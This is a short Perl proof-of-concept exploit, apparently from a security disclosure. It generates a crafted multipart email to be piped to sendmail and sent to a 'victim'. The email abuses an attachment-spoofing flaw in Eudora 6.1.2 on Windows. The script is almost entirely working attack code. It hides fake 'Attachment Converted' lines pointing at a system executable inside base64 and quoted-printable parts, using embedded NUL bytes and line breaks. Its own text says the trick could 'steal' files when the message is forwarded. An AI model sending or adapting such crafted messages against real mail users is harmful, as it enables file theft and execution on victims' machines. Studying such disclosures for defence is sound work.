#!/usr/bin/perl --

use MIME::Base64;

print "From: me\n";
print "To: you\n";
print "Subject: Eudora 6.1.2 on Windows spoof\n";
print "MIME-Version: 1.0\n";
print "Content-Type: multipart/mixed; boundary=\"zzz\"\n";
print "X-Use: Pipe the output of this script into:  sendmail -i victim\n\n";

print "--zzz\n";
print "Content-Type: text/plain\n";
print "Content-Transfer-Encoding: 7bit\n\n";
print "With spoofed attachments, we could 'steal' files if the message
was forwarded (not replied to).\n";

print "\n--zzz\n";
print "Content-Type: text/plain; name=\"b64.txt\"\n";
print "Content-Transfer-Encoding: base64\n";
print "Content-Disposition: inline; filename=\"b64.txt\"\n\n";
$z = "Within base64 encoded, can use embedded NUL or without:\r
Attachment Converted\x00: \"c:\\winnt\\system32\\calc.exe\"\r
Attachment Converted: \"c:\\winnt\\system32\\calc.exe\"\r
\r\n";
print encode_base64($z);

print "\n--zzz\n";
print "Content-Type: text/plain; name=\"qp.txt\"\n";
print "Content-Transfer-Encoding: quoted-printable \n";
print "Content-Disposition: inline; filename=\"qp.txt\"\n\n";
print "Within quoted-printable, can use embedded NUL or linebreak:\n";
print "Attachment Converted=00: \"c:\\winnt\\system32\\calc.exe\"\n";
print "Attachment Converted=
: \"c:\\winnt\\system32\\calc.exe\"\n";

print "\n--zzz--\n";

